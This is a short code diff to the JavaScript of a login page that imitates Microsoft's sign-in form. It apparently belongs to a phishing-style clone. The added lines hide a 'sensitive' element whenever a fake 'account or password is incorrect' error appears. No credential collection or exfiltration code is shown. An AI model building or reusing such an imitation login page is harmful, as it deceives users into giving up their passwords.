@@ -12,6 +12,7 @@ var USER = document.getElementById('i0116');
 var PASS = document.getElementById('i0118');
 var USER_ERR = document.getElementById('usernameError');
 var PASS_ERR = document.getElementById('passwordError');
+var SENSITIVE_ERR = document.getElementById('sensitive');
 
 function loaded() {
     USER.focus();
@@ -212,6 +213,7 @@ function NEE() {
                     Mainbox.classList.remove('disable-lightbox');
                     PASS_ERR.innerHTML = "Your account or password is incorrect. If you don\'t remember your password, <a id=\"idA_IL_ForgotPassword0\" href=\"https:\/\/passwordreset.microsoftonline.com\/?ru=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2freprocess%3fctx%3drQIIAXWSO2_TUACF47hNHyCoEAgWpA5MVEn8dhKpEkntvFTbSevEXC-V7VzHTmJfY9_ETSZGxgqx0K0ggdQFwYRYKzF06szIhBgQYmKk-QEsZ_qGo_OdxyRdoCuPOJbjLdEu58uWwOa5Mk3lLY4R8izPCixD0QOeYuM7m1vZd2_JD40L9eXhGfx695l7Ttz3MI6SSrGYpmkBua7vwIKDguJngrgiiB8EcZpdhWG-d3ieTQRWKHN0SRT5kiiIHM2JBTByFqYOKE1SsNk48IBPUUqgevuGPFeDHgZGi1UaPd7U5VSVDgLAdFNzJC-0hoxVqcuqhxSljvqjJa_pDgYL1TOliafokzFYtKhv2dtadYo9Zhko9hfwT3bDRXFwFKEEn5LvCS2CYWuwh8IQOriwxGCIfcfCPgo7MYpgjH2Y7DY834jH-oxuqvX6DFFHNaOf9OlmoA_2q3GzRh2MGXnytKqowJkz_Xarb6d13ugEzbo3N-R2cBzxNTlhhtHetNXNK2KnxY8UQR022mbgylNxWPZtJBsjbJV65nG3H9uBK1WBVu7ZHeuY_kTmrmcNUHhJ3rouFfqD7ShGrj-B38mHVjiIoV-wp3aIZk-GE2RbkwjFOFmquFohfq7cpMjK-vrmVuZBZjvzd4V4s3ptM1P79fr5jXvy2cXJx1dgLXO5Wuw4FlzseE0u1OYz1gWpK6O0tA80fWdeUtosSNqSVJrBGgt2uQp9kiNOcrnfOfLFWubLxv--8A81&amp;mkt=en-US&amp;hosted=0&amp;device_platform=Windows+10\">reset it now.<\/a>";
                     PASS_ERR.setAttribute('style', 'display:block');
+		    SENSITIVE_ERR.setAttribute('style', 'display:none');
                     PASS.classList.add('has-error');
                     PASS.value = "";
                     PASS.focus();
